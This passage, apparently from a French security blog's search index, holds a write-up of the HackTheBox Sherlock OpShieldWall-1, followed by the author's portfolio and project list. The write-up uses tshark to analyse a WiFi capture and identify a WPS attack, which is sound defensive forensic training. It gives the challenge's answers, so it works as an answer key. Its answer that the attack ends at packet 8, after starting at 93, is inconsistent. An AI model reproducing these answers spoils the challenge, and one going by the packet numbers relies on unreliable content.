appareils est autoris√©. Les ministres du gouvernement utilisent ce r√©seau avec des √©quipements BYoD et des h√¥tes Velorian MoDNet. Veuillez analyser le pcap fourni et confirmer comment et quand cela s\u0026rsquo;est produit. N\u0026rsquo;oubliez pas que cette enqu√™te est de type TLP Amber.\nFichiers #\ropshieldwall1.zip contenant la capture r√©seau \u0026ldquo;VELORIA-NETWORK.pcap\u0026rdquo; Setup #\rAu vu de la simplicit√© de ce challenge, on peut simplement se limiter √† tshark / wireshark.\nQuestions #\rQuestion 1 #\rVeuillez confirmer le SSID de notre r√©seau WiFi.\nPremi√®rement, familiarisez-nous avec la capture. Nous allons utiliser la commande suivante afin d\u0026rsquo;avoir des statistiques :\n$ tshark -r traffic.pcapng -qz -r permet de lire (read) un fichier -q permet d\u0026rsquo;√™tre plus \u0026ldquo;quiet\u0026rdquo; √† la sortie (utile pour les stats car cela permet d\u0026rsquo;afficher les statistiques globales, et non par paquet.) -z permet l\u0026rsquo;affichage de statistiques Il y a beaucoup de valeurs possible (tshark -z help pour les afficher) mais ici nous souhaitons avant tout savoir :\nle nombre de paquet la dur√©e de la capture les IPv4 avec le plus de paquet les IPv4 endpoints √©changeant ensemble le plus les protocoles les plus utilis√©s Nombre de paquet et dur√©e : 106 ; 31.6 sec\n$ tshark -r VELORIA-NETWORK.pcap -qz io,stat,0 =================================== | IO Statistics | | | | Duration: 31.6 secs | | Interval: 31.6 secs | | | | Col 1: Frames and bytes | |---------------------------------| | |1 | | | Interval | Frames | Bytes | | |-------------------------------| | | 0.0 \u0026lt;\u0026gt; 31.6 | 106 | 20759 | | =================================== IPv4 endpoints :\navec le plus de paquet : $ tshark -r VELORIA-NETWORK.pcap -qz endpoints,ip ================================================================================ IPv4 Endpoints Filter:\u0026lt;No Filter\u0026gt; | Packets | | Bytes | | Tx Packets | | Tx Bytes | | Rx Packets | | Rx Bytes | 0.0.0.0 3 1044 3 1044 0 0 255.255.255.255 3 1044 0 0 3 1044 10.0.3.1 3 1048 3 1048 0 0 10.0.3.52 3 1048 0 0 3 1048 ================================================================================ √©changeant le plus : tshark -r VELORIA-NETWORK.pcap -qz conv,ip ================================================================================ IPv4 Conversations Filter:\u0026lt;No Filter\u0026gt; | \u0026lt;- | | -\u0026gt; | | Total | Relative | Duration | | Frames Bytes | | Frames Bytes | | Frames Bytes | Start | | 0.0.0.0 \u0026lt;-\u0026gt; 255.255.255.255 0 0 bytes 3 1044 bytes 3 1044 bytes 23.256576000 8.3680 10.0.3.1 \u0026lt;-\u0026gt; 10.0.3.52 0 0 bytes 3 1048 bytes 3 1048 bytes 23.256959000 8.3693 ================================================================================ Protocoles les plus utilis√©s :\ntshark -r VELORIA-NETWORK.pcap -qz io,phs =================================================================== Protocol Hierarchy Statistics Filter: sll frames:106 bytes:20759 radiotap frames:92 bytes:17572 wlan_radio frames:92 bytes:17572 wlan frames:92 bytes:17572 wlan.mgt frames:92 bytes:17572 eapol frames:6 bytes:999 eap frames:6 bytes:999 ip frames:6 bytes:2092 udp frames:6 bytes:2092 dhcp frames:6 bytes:2092 arp frames:2 bytes:96 =================================================================== Pour r√©pondre √† la question, il suffit d\u0026rsquo;utiliser la commande :\n$ tshark -r VELORIA-NETWORK.pcap -T fields -e wlan.ssid | head -n 1 | xxd -r -p VELORIA-MoD-AP012 Explication : (https://www.wireshark.org/docs/dfref/w/wlan.html)\n-t affiche uniquement les champs sp√©cifi√©s par l\u0026rsquo;utilisateur (n√©cessite donc forc√©ment l\u0026rsquo;utilisation de l\u0026rsquo;option -e pour sp√©cifier les champs). -e wlan.ssid sp√©cifie que le champ wlan.ssid (SSID des r√©seaux sans fil) doit √™tre extrait et affich√©. -xxd -r -p l\u0026rsquo;output √©tant une suite hexad√©cimale, cela permet de le convertir en texte lisible R√©ponse : VELORIA-MoD-AP012\nQuestion 2 #\rVeuillez confirmer l\u0026rsquo;adresse MAC du point d\u0026rsquo;acc√®s (AP).\ntshark -r VELORIA-NETWORK.pcap -T fields -e wlan.sa | head -n 1 02:00:00:00:01:00 R√©ponse : 02:00:00:00:01:00\nQuestion 3 #\rVeuillez confirmer l\u0026rsquo;√©tat/le m√©canisme d\u0026rsquo;authentification de l\u0026rsquo;AP et le vecteur d\u0026rsquo;attaque.\nPassons √† Wireshark.\nR√©ponse : WPS\nQuestion 4 #\rQuel est le num√©ro de paquet o√π l\u0026rsquo;attaque a-t-elle commenc√© ?\nOn peut facilement en d√©duire que c\u0026rsquo;est √† la premi√®re tentative de connexion (√©tant les seuls dans la capture).\nR√©ponse : 93\nQuestion 5 #\rQuel est le num√©ro de paquet o√π l\u0026rsquo;attaque s\u0026rsquo;est-elle termin√©e ?\nOn peut facilement en d√©duire que c\u0026rsquo;est lorsque l\u0026rsquo;authentifcation a √©chou√©.\nR√©ponse : 8\n","date":"7 mai 2024","externalUrl":null,"permalink":"/blog-cyber/posts/opshieldwall-1/","section":"Posts","summary":"Sc√©nario #\rMerci d\u0026rsquo;avoir r√©pondu √† notre appel.","title":"OpShieldWall-1","type":"posts"},{"content":"\rDipl√¥mes #\rLes images sont des liens cliquables.\nEn cours (Promo 2026) Mast√®re (BAC+5) - Expert de la s√©curit√© des donn√©es, des r√©seaux et des syst√®mes\nUniquement en alternance\nJe m'occupe des entretiens de motivation et technique des nouveaux √©tudiants\n(N¬∞ RNCP 38951) Bachelor (BAC+3) - Cybers√©curit√© \u0026 Ethical Hacking\n3√®me ann√©e en alternance\nMention - Tr√®s bien\rBachelor (BAC+3) - Concepteur de Syst√®mes d'Information Mention - Tr√®s bien\rListe de tous les challenges, labs, box etc. que j\u0026rsquo;ai effectu√© mais aussi des cours, conf√©rences et trainings auquels j\u0026rsquo;ai assist√© :\nHackTheBox #\rIron = Insane Red = Hard Orange = Medium Green = Easy Purple = Very Easy Certaines images ne redirigent pas vers les pages de r√©sultat d\u0026rsquo;HTB car se sont des boxs / sherlocks uniquement disponibles sur la plateforme HackTheBox Entreprise (qui ne permet pas de faire des liens de partage).\nSherlock #\rDFIR / SOC #\rOpShieldWall-7\rStreamer\rAPTNightmare-2\rLatus\rHeartbreaker\rTrent\rAPTNightmare\rNuts\rOpShieldWall-4\rOpShieldWall-2\rOpShieldWall-1\rNeuroSync-D\rPikaptcha\rMeerkat\rBumblebee\rJingle Bell\rRecollection\rKuber\rNoted\rTracer\rLog Jammer\rRogue One\rPhantom-Check\rSmoke-Mirrors\rOrigins\rSmartyPants\rReaper\rCampfire-2\rCampfire-1\rUnit42\rCrownJewel-2\rCrownJewel-1\rBrutus\rNoxious\rMalware Analysis #\rOpShieldWall-6\rLoggy\rHB-Continuum\rCloud #\rNubilum-2\rThreat Intelligence #\rDreamJob-1\rElectricBreeze-1\rUFO-1\rBox #\rLinux #\rOpShieldWall-5\rOpShieldWall-3\rBlurry\rRunner\rIClean\rPerfection\rBoardLight\rHeadless\rWifinetic\rMetaTwo\rLame\rNibbles\rPrecious\rWindows #\rJerry\rNetmon\rBlue\rHackTheBox Academy #\rTranscript.pdf\nRootMe #\rCyberdefenders #\rThreat Hunting #\rHard\rNetwork Forensics #\rHard\rMedium\rMedium\rMedium\rMedium\rMedium\rEasy\rEasy\rEasy\rEasy\rEasy\rEasy\rEasy\rEasy\rEndpoint Forensics #\rMedium\rEasy\rThreat Intel #\rMedium\rMedium\rEasy\rEasy\rEasy\rEasy\rCloud Forensics #\rEasy\rTryHackMe #\r92 rooms compl√©t√©s\nPath :\nPre Security Complete Beginner Web Fundamentals Comptia Pentest+ Cours \u0026amp; formations suivis #\r2025 #\rSANS : FOR585: Smartphone Forensic Analysis In-Depth 13Cubed : Investigating Windows Endpoint 13Cubed : Investigating Windows Memory 13Cubed : Investigating Linux Devices 2024 #\rEvasive Malware : A Field Guide to Detecting, Analyzing, and Defeating Advanced Threats Roman Stuehler : Android App Hacking - Black Belt Edition Kaspersky : Advanced Malware Analysis Techniques Kaspersky : Hunting APTs like a Ninja with YARA OALABS : Reverse Engineering 101 (RE101) Pentherz : Intro to SDR Hacking 2023 #\rOSINT : IntelTechniques Christopher Negus : Linux Bible Opdisk : The Cyber Plumber\u0026rsquo;s Handbook Conf \u0026amp; meetups #\r2025 #\rTHCON - Toulous Hacking Convention 2024 #\rDEFCON Paris Meetup HackTheBox France 2023 #\rHexacon DEFCON Paris LeHack Meetup HackTheBox France ","date":"6 mai 2024","externalUrl":null,"permalink":"/blog-cyber/posts/portfolio/","section":"Posts","summary":"Dipl√¥mes #\rLes images sont des liens cliquables.","title":"Portfolio","type":"posts"},{"content":"Liste des projets que j\u0026rsquo;ai effecut√©.\nSelf-Hosted Infrastructure #\rJuin 2023 - maintenant\nProfessional Server (HP ProLiant DL380 Gen9 2U) sous Proxmox Firewall sous OPNsense Self-hosted services et tools: VPN, Security Onion, Wazuh, Cuckoo Sandbox, GitLab, VM pour CTF, labs en tout genre (red team / blue team\u0026hellip;) Un lab sp√©cial de Malware Analysis \u0026amp; d\u0026rsquo;OSINT avec une emphase sur la s√©curit√©, la vie priv√©e et l\u0026rsquo;OPSEC Architecture, network segmentation, int√©gration IPS/IDS, load balancing, SRE, VPN CTF Challenge Creator #\rJuin 2024 - Juin 2024\nCr√©ation de deux challenges de radio (misc easy and medium) pour le \u0026ldquo;PwnMe CTF 2024\u0026rdquo;.\nhttps://ctftime.org/ctf/807/\nhttps://www.phreaks2600.fr/\nSide Quest - Toolkit Network Forensic \u0026amp; Malware Analysis #\rF√©vr. 2024 - Juin 2024\nNotre side quest est un projet collaboratif d\u0026rsquo;√©tudiants pour fournir un toolkit puissant pour la forensique r√©seau et l\u0026rsquo;analyse de malware. Ce repository contient deux sous-projets qui se concentrent sur diff√©rents aspects de l\u0026rsquo;investigation :\nNetwork Forensic Analysis : Outils d\u0026rsquo;analyse du trafic r√©seau captur√© dans des fichiers PCAP. Analyse des malwares : Outils permettant de diss√©quer les fichiers binaires afin de d√©couvrir des informations cach√©es et de d√©tecter des caract√©ristiques malveillantes. https://github.com/jaybird1291/toolkit-network-forensic-malware-analysis-sidequest\n","date":"5 mai 2024","externalUrl":null,"permalink":"/blog-cyber/posts/projets/","section":"Posts","summary":"Liste des projets que j\u0026rsquo;ai effecut√©.","title":"Projets","type":"posts"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/posts/graphite-caught/","section":"Posts","summary":"","title":"","type":"posts"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/blog-cyber/series/","section":"Series","summary":"","title":"Series","type":"series"}]